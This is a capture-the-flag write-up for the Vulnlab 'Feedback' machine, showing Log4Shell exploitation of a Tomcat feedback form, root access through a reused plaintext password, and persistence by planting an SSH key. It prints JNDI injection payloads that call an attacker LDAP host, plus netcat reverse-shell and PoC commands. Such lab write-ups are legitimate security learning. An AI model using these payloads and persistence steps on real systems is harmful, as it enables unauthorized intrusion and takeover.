+++
date = '2026-05-21T17:40:39+02:00'
draft = false
title = 'Feedback Writeup EN'
+++
**Name**: `joy.scd01`

**Date**: `13/06/2025`

![feedback.png](/images/imgs_feedback/feedback.png)

---
# Introduction

_Feedback_ is a Linux machine classified as _Easy_.
I found it simple, yet really interesting and educational.
It exposes a **Tomcat** instance vulnerable to **Log4Shell (CVE-2021-44228)** — one of the most critical **RCEs** ever discovered in Java environments.

After gaining initial access by exploiting this vulnerability, I was able to read a configuration file that contained a **clear-text password**, which turned out to be **reused for the root user**, allowing me to fully compromise the box.

---
# Techniques Used

-  **Log4Shell (CVE-2021-44228) - Remote Code Execution**
-  **Password Reuse**

---
# Enumeration

**nmap**

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV feed
```

![nmap.png](/images/imgs_feedback/nmap.png)

**2 open ports**:
- **22/tcp** - ssh
- **8080/tcp** - http

**Web Enumeration - http://feed:8080**

The service exposed a **default Tomcat page**, so I ran **gobuster** to enumerate possible directories:

```bash
gobuster dir -u http://feed:8080 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

![gob1.png](/images/imgs_feedback/gob1.png)

Inspecting the page source of `/feedback`, I discovered:
- The app was written in **Java**
- It used **Struts2** as a framework and **Log4j** for logging

At this point, a quick Google search revealed clear references to **CVE-2021-44228**, also known as **Log4Shell**.

This is a critical vulnerability that allows remote code execution via JNDI injection.
In short: if a user-controlled input is logged and includes a payload like `${jndi:ldap://attacker.com/a}`, **Log4j** may fetch and execute remote code.

---
# Initial Access - CVE-2021-44228 Log4Shell → RCE

_To exploit this vulnerability, I used the following **proof-of-concept repository**._

Source: [https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

Following this order, I set up:

-  **A compatible Java version (jdk1.8.0_20)**

Source: [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

**Note**: _You’ll need an Oracle account to download the archive, and you’ll want the specific package named **"Java SE Development Kit 8u20"**._

![java.png](/images/imgs_feedback/java.png)

_Then to install and verify it:_

```bash
tar -xf jdk-8u20-linux-x64.tar.gz

./jdk1.8.0_20/bin/java -version
```

![javaold.png](/images/imgs_feedback/javaold.png)

Once I confirmed the Java environment was ready, I prepared:
-  **A Netcat listener to catch the reverse shell**

```bash
nc -lvnp 22667
```

-  **A malicious LDAP server**

```bash
python3 poc.py --userip 10.8.6.158 --webport 8000 --lport 22667
```

**Then, I injected the following payload**:

```text
${jndi:ldap://10.8.6.158:1389/a}
```

**into both form fields on `/feedback` to trigger the reverse shell and get initial access.**

![send.png](/images/imgs_feedback/send.png)

![initialaccess.png](/images/imgs_feedback/initialaccess.png)

---
# Privilege Escalation | Password Reuse → root

After obtaining a foothold, I began my usual enumeration routine, checking around the file system for any sensitive information.

Inside `/conf/tomcat-users.xml` I found credentials stored in plaintext:

```xml
<user username="admin" password="<REDACTED>" roles="manager-gui,admin-gui"/>
```

I attempted to switch users using that password for **root**:

```bash
su root
```

That was enough to get **root access** and capture the **root flag**.

However, SSH login for root was **restricted to public key authentication only**.
So, to ensure persistent access, I simply added my public key to `/root/.ssh/authorized_keys`.

---
# Final Thoughts

As usual, I find Vulnlab machines to be absolute gems. They always introduce you to new techniques, alternative tools, and real-world applicable scenarios.

**Feedback**, in particular, gave me the opportunity to explore the **Log4Shell vulnerability** in depth.
I hadn’t looked into it closely before, and this machine helped me understand how it works and why it had such a devastating impact.

**Sources**

- **GitHub repository with the Log4Shell PoC** | https://github.com/kozmer/log4j-shell-poc

- **Official Oracle archive to download older Java versions** | https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html